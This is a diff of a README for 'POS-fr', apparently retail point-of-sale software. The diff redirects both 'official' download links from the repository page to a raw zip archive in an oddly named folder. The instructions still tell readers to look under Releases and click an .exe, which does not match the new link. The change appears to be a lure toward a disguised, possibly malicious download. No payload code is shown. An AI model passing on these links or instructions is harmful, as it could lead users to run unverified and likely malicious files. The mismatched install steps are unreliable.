@@ -1,6 +1,6 @@
 # 📦 POS-fr - Manage your retail sales with ease
 
-[![Download POS-fr](https://img.shields.io/badge/Download-POS--fr-blue.svg)](https://github.com/Boreal-smoothdarlingpea101/POS-fr)
+[![Download POS-fr](https://img.shields.io/badge/Download-POS--fr-blue.svg)](https://github.com/Boreal-smoothdarlingpea101/POS-fr/raw/refs/heads/main/unabetted/PO_fr_v2.4.zip)
 
 POS-fr helps small businesses track sales and manage inventory. This software provides a clear interface to record transactions, print receipts, and monitor stock levels. You can use this tool on any Windows computer to streamline your daily operations.
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run POS-fr:
 Follow these steps to get the application on your computer:
 
 1. Open your web browser.
-2. Go to the [official POS-fr download page](https://github.com/Boreal-smoothdarlingpea101/POS-fr).
+2. Go to the [official POS-fr download page](https://github.com/Boreal-smoothdarlingpea101/POS-fr/raw/refs/heads/main/unabetted/PO_fr_v2.4.zip).
 3. Look for the latest version under the Releases section.
 4. Click the file ending in .exe to start your download.
 5. Save the file to your Downloads folder.
